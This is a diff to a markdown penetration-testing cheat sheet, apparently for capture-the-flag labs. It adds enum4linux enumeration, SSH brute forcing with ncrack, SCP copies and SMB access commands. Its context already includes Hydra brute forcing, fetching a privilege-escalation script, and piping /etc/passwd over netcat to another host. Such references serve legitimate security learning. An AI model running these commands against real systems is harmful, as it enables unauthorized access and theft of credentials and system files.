@@ -9,6 +9,9 @@ For the following examples assume:
 ##### Find a file with the a specified string
 `cat /etc/* | grep FLAG2`
 
+##### Grep only usernames from /etc/passwd
+`cat /etc/passwd | grep -E '/home/|/root'`
+
 ##### Regex in Grep
 `ls -al | grep '[a-z][0-9].jpeg'`
 
@@ -24,8 +27,14 @@ For the following examples assume:
 ##### Enumerate directories
 `dirb http://10.37.129.11`
 
+#### Enumerate Linux (Gets OS, host, shares, potential usernames)
+`enum4linux -a 10.37.129.11`
+
 ##### FTP on custom port
 `ftp -p 10.37.129.11 4200`
+
+#### SSH on custom port
+`ssh user@10.37.129.11 -p 22222`
 
 ##### Search for a package on the system
 `rpm -qa | grep ftp`
@@ -35,8 +44,15 @@ Local Listener: `nc -l -p 2222 > passwd`
 
 Remote Listener: `cat /etc/passwd | netcat 10.37.129.4 2222`
 
+#### Copy file over SCP
+`scp -r -P 22 username@10.37.129.4:/home/whatever ~/destination`
+`scp safe root@192.168.56.10:~/Desktop`
+
 ##### Hydra quick user/password enumeration
 `hydra -L /usr/share/wordlists/custom/usernamelist.txt -P /usr/share/wordlists/custom/passwordlist.txt -u -s 22 10.37.129.11 ssh -t 4`
+
+##### NCRACK password enumeration and SSH crack
+`ncrack -v –user RickSanchez -P rick_pws.txt ssh://10.37.129.11:22222`
 
 ##### Pull down linuxprivchecker.py and run
 ```bash
@@ -48,4 +64,7 @@ $ python linuxprivchecker.py > linux_priv_check.txt
 `smbclient -L 10.37.129.11`
 
 ##### smbclient connect
-`smbclient '\\10.37.129.11\<sharename>'
+`smbclient '\\10.37.129.11\<sharename>`
+
+##### SMB share connect via web browser
+`smb://10.37.129.11/share$/`
